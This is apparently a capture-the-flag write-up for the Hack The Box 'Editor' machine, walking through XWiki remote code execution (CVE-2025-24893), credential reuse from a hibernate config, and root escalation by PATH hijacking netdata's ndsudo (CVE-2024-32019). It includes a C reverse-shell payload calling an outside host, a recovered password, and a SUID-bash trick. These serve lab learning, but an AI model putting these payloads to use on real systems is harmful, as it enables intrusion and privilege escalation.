Tags: #Linux/Ubuntu #Easy #Nginx #Hidden-Subdomains #Command-Injection #Hardcoded-Creds #Outdated-software #Path-Injection  
# **Nmap Results**

```text
Nmap scan report for 10.10.11.80
Host is up (0.019s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.25 seconds

```
<br>
<br>

# **Service Enumeration**
First look at the site:

![[Pasted image 20250804154212.png]]

There's an **xwiki** page on port 8080, which can also be accessed at **wiki.editor.htb**:

![[Pasted image 20250804154322.png]]

At the page's footer, the version is revealed to be **XWiki Debian 15.10.8**. 

The nmap scan found a `/robots.txt` page containing a bunch of pages that perform xwiki operations. Most of them redirect you to a login form:

![[Pasted image 20250804154521.png]]
<br>
<br>
# **Exploitation**
## **Initial Access**
After researching a while, I found a page on [ionix.io](https://www.ionix.io/blog/xwiki-remote-code-execution-vulnerability-cve-2025-24893/) explaining how this specific XWiki version has a parameter "text" that is vulnerable to RCE in the `/SolrSearch` page. 

There is also a POC script on this [GitHub](https://github.com/gunzf0x/CVE-2025-24893) page that was successful in executing a reverse shell, which logs us in as `xwiki`:

![[Pasted image 20250804171421.png]]

Enumeration for other useful info was difficult, as I kept coming back empty handed. All I knew was that I needed to log in as oliver after looking at the contents of /etc/passwd where lines end in "sh" (`cat /etc/passwd | grep sh$`):

```
root:x:0:0:root:/root:/bin/bash
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

Eventually, I ran `grep -riH "password" .` and found some interesting lines:

```
./hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
./hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
./hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
./hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
./hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
./hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
./hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
```  

The password `theEd1t0rTeam99` ended up being valid for the user **oliver** via SSH.
<br>
<br>
# **Privilege Escalation**  
There's a program called "netdata" in the **/opt** directory. The following output of `ss -tulnp` shows open ports that are listening for connections:

![[Pasted image 20250804185849.png]]

Out of all of them, port 19999 is the one that netdata usually listens on, according to a quick google search and the netdata documentation. So now, we'll log out and log back into SSH with port forwarding configured to expose this port. 

This is what we see at `http://localhost:19999`:

![[Pasted image 20250804190143.png]]

Near the top, there's a notification urging us to update a node to the recommended version. If we click "Please update them", we see the target machine running netdata **v1.45.2**.

**CVE-2024-32019** describes a vulnerability in the `ndsudo` binary within this specific version. `ndsudo` allows the user to execute a restricted list of commands as root, but it relies on the PATH environment variable to find said commands. This means an attacker can create a malicious script and give it a name that `ndsudo` might expect, and execute it.

Create the following C script and compile it. Name the resulting binary "nvme":

```c
#include <unistd.h>  // for setuid, setgid, execl
#include <stddef.h>  // for NULL

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.23/9001 0>&1", NULL);
    return 0;
}

```

Copy the compiled binary to the target machine and make it executable. Before running ndsudo,  define a temporary PATH variable where the location of your malicious binary is placed before everything else (e.g `PATH=/dev/shm:$PATH`) 

Then in the directory where ndsudo is, run `PATH=/dev/shm:$PATH ./ndsudo nvme-list`:

![[Pasted image 20250804221340.png]]

> [!tip] SUID Bit and Interpreted Scripts
> Initially, I tried creating a bash script with the following content:
> ```bash
> #!/bin/bash
>
> bash -i
> ```
> I put it in `/dev/shm`, temporarily defined PATH with that directory in the front, and executed `ndsudo nvme-list`. However, I got a shell as the current user. The root privileges that `ndsudo` had didn't carry over to the shell script because of a kernel security policy and the way bash is designed.
> 
> When an executable has an SUID bit, it gives the user running it the privileges of who owns it, usually root.
>
>The kernel policy prevents **interpreted** scripts with an SUID/SGID bit from inheriting the privileges of the owner by **removing that bit** before execution. This is because they can be susceptible to race conditions, and if a legitimate script is swapped for a malicious one at the right time, the latter will execute. This was never a problem for us, but it's important to note.
> 
> Furthermore, Bash checks whether the EUID (Effective UID) and RUID (Real UID) match before executing any script, and if they don't match, it will **automatically reset** the EUID back to the unchanged RUID. This is what stopped `bash -i` from inheriting root privs.
> 
> It is possible to make a bash script work though, you'd have to invoke the interpreter with the `-p` flag, telling bash to not drop any privileges and give `/bin/bash` an SUID bit:
>```bash
>#!/bin/bash -p
>
>chmod +s /bin/bash
>```
>Then execute `bash -pi` in the terminal and you get a root shell
>
> With binaries it's different, as there's no interpreter to begin with, so it just inherits the EUID (effective UID) of the parent process, which is 0, and runs as root. In our case with the compiled C script, you just have to make sure you invoke `setuid(0)` and `setgid(0)`. Neither the kernel security policy nor bash's internal design can prevent this. In fact, if you're not using bash, the privileges **won't** be dropped at all. That feature is unique.
<br>
<br>
# Skills Learned
* `grep` can recursively search through files with the `-r` flag, but to know where a potential match comes from, you should also specify the `-H` flag.
* When dealing with Java apps or XML and you have user, try recursively grepping "password" in some areas. 
<br>
<br>
# Proof of Pwn
https://labs.hackthebox.com/achievement/machine/391579/684